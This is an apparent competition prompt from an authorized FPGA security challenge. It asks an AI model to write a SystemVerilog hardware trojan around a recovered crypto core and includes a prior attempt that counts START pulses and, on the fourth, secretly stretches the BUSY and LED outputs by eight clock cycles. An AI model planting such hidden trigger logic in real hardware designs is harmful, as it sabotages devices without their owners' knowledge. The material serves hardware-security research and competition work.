@@ -1,0 +1,129 @@
+Model: @vertexai/gemini-3.1-pro-preview
+
+
+Context: CSAW 2026 AI Hardware Attack Challenge, an authorized academic
+FPGA security experiment using a provided, local simulation target.
+Generate a candidate SystemVerilog hardware modification.
+
+Original module recovered has ports:
+pin_36=SCK, pin_25=ENC_DEC, pin_28=NORM_CS_N, pin_32=MOSI,
+pin_34=RST_N, pin_27=START, pin_38=BUSY, pin_23=ICE_LED, pin_31=MISO.
+
+Return exactly ONE SystemVerilog code block containing ONE module called
+recovered. Instantiate recovered_original, connecting the ORIGINAL pin_*
+port names; NEVER redefine recovered_original.
+Preserve the original cryptographic datapath and all untriggered outputs.
+SPI transactions are MSB-first, 32 bits, NORM_CS_N=0, START=0.
+START is asserted separately with NORM_CS_N=1.
+Reset is synchronous active-low. Do not claim functional verification.
+
+Variant: performance
+Specification:
+Trigger: fourth START assertion sampled on a rising SCK edge since reset.
+Payload: extend externally visible BUSY by eight SCK cycles after core completion.
+Do not modify the core's cryptographic computation. Earlier operations must remain unaffected.
+
+Verified key evidence (if applicable): 
+
+Prior RTL (empty for first attempt):
+module recovered (
+    input  logic pin_36, // SCK
+    input  logic pin_25, // ENC_DEC
+    input  logic pin_28, // NORM_CS_N
+    input  logic pin_32, // MOSI
+    input  logic pin_34, // RST_N
+    input  logic pin_27, // START
+    output logic pin_38, // BUSY
+    output logic pin_23, // ICE_LED
+    output logic pin_31  // MISO
+);
+
+    // Internal signals to monitor original module's outputs
+    logic orig_busy;
+    logic orig_ice_led;
+    logic orig_miso;
+
+    // Instantiate the original, unmodified core
+    recovered_original core_inst (
+        .pin_36(pin_36),
+        .pin_25(pin_25),
+        .pin_28(pin_28),
+        .pin_32(pin_32),
+        .pin_34(pin_34),
+        .pin_27(pin_27),
+        .pin_38(orig_busy),
+        .pin_23(orig_ice_led),
+        .pin_31(orig_miso)
+    );
+
+    // State for the hardware modification trigger and payload
+    logic       start_d;
+    logic [2:0] start_cnt;
+    logic       orig_busy_d;
+    
+    logic [2:0] extend_cnt;
+    logic       extend_active;
+    logic       payload_done;
+
+    always_ff @(posedge pin_36) begin
+        if (!pin_34) begin // Synchronous active-low reset
+            start_d       <= 1'b0;
+            start_cnt     <= 3'd0;
+            orig_busy_d   <= 1'b0;
+            extend_cnt    <= 3'd0;
+            extend_active <= 1'b0;
+            payload_done  <= 1'b0;
+        end else begin
+            start_d     <= pin_27;
+            orig_busy_d <= orig_busy;
+
+            // Trigger: Count START assertions sampled on rising SCK edge
+            if (pin_27 && !start_d) begin
+                if (start_cnt < 3'd7) begin
+                    start_cnt <= start_cnt + 1'b1;
+                end
+            end
+
+            // Payload: Extend externally visible BUSY by 8 cycles upon the 4th completion
+            if (start_cnt == 3'd4 && !payload_done && !extend_active && !orig_busy && orig_busy_d) begin
+                // On falling edge of orig_busy during the 4th operation, start 8-cycle extension
+                // (1 cycle is covered by the combinational trigger, 7 cycles by the counter)
+                extend_active <= 1'b1;
+                extend_cnt    <= 3'd6;
+            end else if (extend_active) begin
+                if (extend_cnt == 3'd0) begin
+                    extend_active <= 1'b0;
+                    payload_done  <= 1'b1; // Mark payload as completed to avoid re-triggering
+                end else begin
+                    extend_cnt <= extend_cnt - 1'b1;
+                end
+            end
+        end
+    end
+
+    // Combinational logic to seamlessly extend BUSY and ICE_LED without a 1-cycle gap
+    wire extend_trigger = (start_cnt == 3'd4) && !payload_done && !extend_active && !orig_busy && orig_busy_d;
+    wire extension = extend_active | extend_trigger;
+
+    // Extend BUSY and ICE_LED seamlessly
+    assign pin_38 = orig_busy | extension;
+    assign pin_23 = orig_ice_led | extension;
+
+    // Pass-through untriggered outputs
+    assign pin_31 = orig_miso;
+
+endmodule
+
+
+Feedback to address:
+
+The fourth START trigger is detected correctly, but the BUSY extension
+remains enabled after the fourth operation because start_cnt stays equal to 4. 
+Modify the state machine so that exactly the fourth operation has its visible 
+BUSY falling edge delayed by eight SCK cycles. 
+Clear the payload after the delay finishes, without modifying subsequent 
+operations. Keep ICE_LED consistent with the intended BUSY behavior. 
+Preserve the recovered_original instance and all original port names.
+
+
+Output only the complete recovered module in a ```systemverilog block.
